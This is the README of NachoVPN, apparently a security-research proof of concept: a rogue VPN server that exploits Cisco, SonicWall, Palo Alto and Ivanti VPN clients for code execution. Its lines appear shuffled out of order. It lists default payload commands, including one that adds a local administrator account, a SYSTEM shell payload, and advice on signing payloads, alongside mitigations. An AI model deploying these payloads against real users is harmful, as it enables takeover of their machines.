
        <img src="https://github.com/AmberWolfCyber/NachoVPN/actions/workflows/build-docker.yml/badge.svg" /></a>
        <img src="https://img.shields.io/badge/License-MIT-yellow.svg" /></a>
    <a href="LICENSE" alt="License: MIT">
    <a href="https://github.com/AmberWolfCyber/NachoVPN/actions/workflows" alt="Docker Build">
    <img src="logo.png">
## Building for distribution
## Contributing
## Installation
## License
## Mitigations
## References
## Running
### Building a container image
### Building a wheel file
### Building for local development
### Debugging
### Environment Variables
### Installing from source
### Plugins
### Prerequisites
#### Disabling a plugin
#### Operating Notes
#### URI handlers
* Consider using an Application Control policy, such as WDAC, or an EDR solution to ensure that only approved executables and scripts can be executed by the VPN client.
* Detect and alert on VPN clients executing non-standard child processes.
* Docker (optional)
* Ensure SSL-VPN clients are updated to the latest version available from the vendor.
* For convenience, a default `NACAgent.exe` payload is generated for the SonicWall plugin, and written to the `payloads` directory. This simply spawns a new `cmd.exe` process on the current user's desktop, running as `SYSTEM`.
* In order to simulate a valid codesigning certificate for the SonicWall plugin, NachoVPN will sign the `NACAgent.exe` payload with a self-signed certificate. For testing purposes, you can download and install this CA certificate from `/sonicwall/ca.crt` before triggering the exploit. For production use-cases, you will need to obtain a valid codesigning certificate from a public CA, sign your `NACAgent.exe` payload, and place it in the `payloads` directory (or volume mount it into `/app/payloads`, if using docker).
* It is recommended to use a TLS certificate that is signed by a trusted Certificate Authority. The docker container automates this process for you, using certbot. If you do not use a trusted certificate, then NachoVPN will generate a self-signed certificate instead, which in most cases will either cause the client to prompt with a certificate warning, or it will refuse to connect unless you modify the client settings to accept self-signed certificates. For the Palo Alto GlobalProtect plugin, this will also cause the MSI installer to fail.
* Most VPN clients support the concept of locking down the VPN profile to a specific endpoint, or using an always-on VPN mode. This should be enabled where possible.
* Python 3.9 or later
* The Ivanti Connect Secure (Pulse Secure) URI handler can be triggered by visiting the `/pulse` URL on the NachoVPN server.
* The Palo Alto GlobalProtect plugin requires that the MSI installers and `msi_version.txt` file are present in the `downloads` directory. Either add these manually, or run the `msi_downloader.py` script to download them.
* The SonicWall NetExtender URI handler can be triggered by visiting the `/sonicwall` URL on the NachoVPN server. This requires that the SonicWall Connect Agent is installed on the client machine.
* Unfortunately, in some cases this lockdown can be removed by a malicious local user, therefore it is also recommended to use host-based firewall rules to restrict the IP addresses that the VPN client can communicate with.
* [AmberWolf Blog: NachoVPN](https://blog.amberwolf.com/blog/2024/november/introducing-nachovpn---one-vpn-server-to-pwn-them-all/)
* [BlackHat 2008: Leveraging the Edge: Abusing SSL VPNs, Mike Zusman](https://www.blackhat.com/presentations/bh-usa-08/Zusman/BH_US_08_Zusman_SSL_VPN_Abuse.pdf)
* [BlackHat 2019: Infiltrating Corporate Intranet Like NSA, Orange Tsai & Meh Chang](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)
* [HackFest Hollywood 2024: Very Pwnable Networks: Exploiting the Top Corporate VPN Clients for Remote Root and SYSTEM Shells, Rich Warren & David Cash](https://github.com/AmberWolfCyber/presentations/blob/main/2024/Very%20Pwnable%20Networks%20-%20HackFest%20Hollywood%202024.pdf) [[video](https://www.youtube.com/watch?v=-MZfkmcZRVg)]
* [NCC Group: Making New Connections: Leveraging Cisco AnyConnect Client to Drop and Run Payloads, David Cash & Julian Storr](https://www.nccgroup.com/uk/research-blog/making-new-connections-leveraging-cisco-anyconnect-client-to-drop-and-run-payloads/)
* [The OpenConnect Project](https://www.infradead.org/openconnect/)
* git (optional)
* msitools (Linux only)
* osslsigncode (Linux only)
.\env\Scripts\activate
</p>
<p align="center">
Alternatively, for local development you can install the package in editable mode using:
Alternatively, for testing purposes, you can skip the certificate generation by setting the `SKIP_CERTBOT` environment variable.
Alternatively, if the logging is too noisy, you can use the `q` or `--quiet` command line argument instead.
Alternatively, you can run the server using Docker:
An example [docker-compose file](docker-compose.yml) is also provided for convenience.
DISABLED_PLUGINS=CiscoPlugin,SonicWallPlugin
First, clone this repository, and install `setuptools` and `wheel` via pip. You can then run the `setup.py` script:
First, create a virtual environment. On Linux, this can be done with:
For further details, see our [blog post](https://blog.amberwolf.com/blog/2024/november/introducing-nachovpn---one-vpn-server-to-pwn-them-all/), and HackFest Hollywood 2024 presentation [[slides](https://github.com/AmberWolfCyber/presentations/blob/main/2024/Very%20Pwnable%20Networks%20-%20HackFest%20Hollywood%202024.pdf)|[video](https://www.youtube.com/watch?v=-MZfkmcZRVg)].
Global environment variables:
If you prefer to use Docker, then you can pull the container from the GitHub Container Registry:
If you're interested in developing a new plugin, you can take a look at the [ExamplePlugin](src/nachovpn/plugins/example/plugin.py) to get started.
It uses a plugin-based architecture so that support for additional SSL-VPN products can be contributed by the community. It currently supports various popular corporate VPN products, such as Cisco AnyConnect, SonicWall NetExtender, Palo Alto GlobalProtect, and Ivanti Connect Secure.
NachoVPN can be installed from GitHub using pip. Note that this requires git to be installed.
NachoVPN is a Proof of Concept that demonstrates exploitation of SSL-VPN clients, using a rogue VPN server.
NachoVPN is configured using environment variables. This makes it easily compatible with containerised deployments.
NachoVPN is licensed under the MIT license. See the [LICENSE](LICENSE) file for details.
NachoVPN supports the following plugins and capabilities:
On Windows, use:
Plugin specific environment variables:
Then, install NachoVPN:
This will generate a certificate for the `SERVER_FQDN` using certbot, and save it to the `certs` directory, which we've mounted into the container.
This will generate a self-signed certificate instead.
This will generate a wheel file in the `dist` directory, which can be installed with pip:
To disable a plugin, add it to the `DISABLED_PLUGINS` environment variable. For example:
To run the server as standalone, use:
We recommend the following mitigations:
We welcome contributions! Please open an issue or raise a Pull Request.
You can build the container image with the following command:
You can run `nachovpn` with the `-d` or `--debug` command line arguments in order to increase the verbosity of logging, which can aid in debugging.
```
```bash
docker build -t nachovpn:latest .
docker pull ghcr.io/amberwolfcyber/nachovpn:release
docker run -e SERVER_FQDN=connect.nachovpn.local -e EXTERNAL_IP=1.2.3.4 -v ./certs:/app/certs -p 80:80 -p 443:443 --rm -it nachovpn
docker run -e SERVER_FQDN=connect.nachovpn.local -e SKIP_CERTBOT=1 -e EXTERNAL_IP=1.2.3.4 -p 443:443 --rm -it nachovpn
git clone https://github.com/AmberWolfCyber/NachoVPN
pip install -U setuptools wheel
pip install -e .
pip install dist/nachovpn-1.0.0-py3-none-any.whl
pip install git+https://github.com/AmberWolfCyber/NachoVPN.git
python -m nachovpn.server
python -m venv env
python setup.py bdist_wheel
python3 -m venv env
source env/bin/activate
| -------- | ----------- | ------- |
| -------- | ----------- | -------- | -------- | -------- | -------- | -------- | -------- | ---- |
| Plugin | Product | CVE | Windows RCE | macOS RCE | Privileged | URI Handler | Packet Capture | Demo |
| Variable | Description | Default |
| `CISCO_COMMAND_MACOS` | The command to be executed by the Cisco AnyConnect OnConnect.sh script on macOS. | `touch /tmp/pwnd` |
| `CISCO_COMMAND_WIN` | The command to be executed by the Cisco AnyConnect OnConnect.vbs script on Windows. | `calc.exe` |
| `DISABLED_PLUGINS` | A comma-separated list of plugins to disable. | |
| `EXTERNAL_IP` | The external IP address of the server. | `127.0.0.1` |
| `PALO_ALTO_FORCE_PATCH` | Whether to force the patching of the MSI installer if it already exists in the payloads directory. | `false` |
| `PALO_ALTO_MSI_ADD_FILE` | The path to a file to be added to the Palo Alto installer MSI. | |
| `PALO_ALTO_MSI_COMMAND` | The command to be executed by the Palo Alto installer MSI. | `net user pwnd Passw0rd123! /add && net localgroup administrators pwnd /add` |
| `PALO_ALTO_PKG_COMMAND` | The command to be executed by the Palo Alto installer PKG on macOS. | `touch /tmp/pwnd` |
| `PULSE_ANONYMOUS_AUTH` | Whether to use anonymous authentication for Pulse Secure connections. If set to `true`, the user will not be prompted for a username or password. | `false` |
| `PULSE_DNS_SUFFIX` | The DNS suffix to be used for Pulse Secure connections. | `nachovpn.local` |
| `PULSE_LOGON_SCRIPT_MACOS` | The path to the Pulse Secure logon script for macOS. | |
| `PULSE_LOGON_SCRIPT` | The path to the Pulse Secure logon script. | `C:\Windows\System32\calc.exe` |
| `PULSE_SAVE_CONNECTION` | Whether to save the Pulse Secure connection in the user's client. | `false` |
| `PULSE_USERNAME` | The username to be pre-filled in the Pulse Secure logon dialog. | |
| `SERVER_FQDN` | The fully qualified domain name of the server. | `connect.nachovpn.local` |
| `SERVER_MD5_THUMBPRINT` | Allows overriding the calculated MD5 thumbprint for the server certificate. | |
| `SERVER_SHA1_THUMBPRINT` | Allows overriding the calculated SHA1 thumbprint for the server certificate. | |
| `USE_DYNAMIC_SERVER_THUMBPRINT` | Whether to calculate the server certificate thumbprint dynamically from the server (useful if behind a proxy). | `false` |
| `VPN_NAME` | The name of the VPN profile, which is presented to the client for Cisco AnyConnect. | `NachoVPN` |
| `WRITE_PCAP` | Whether to write captured PCAP files to disk. | `false` |
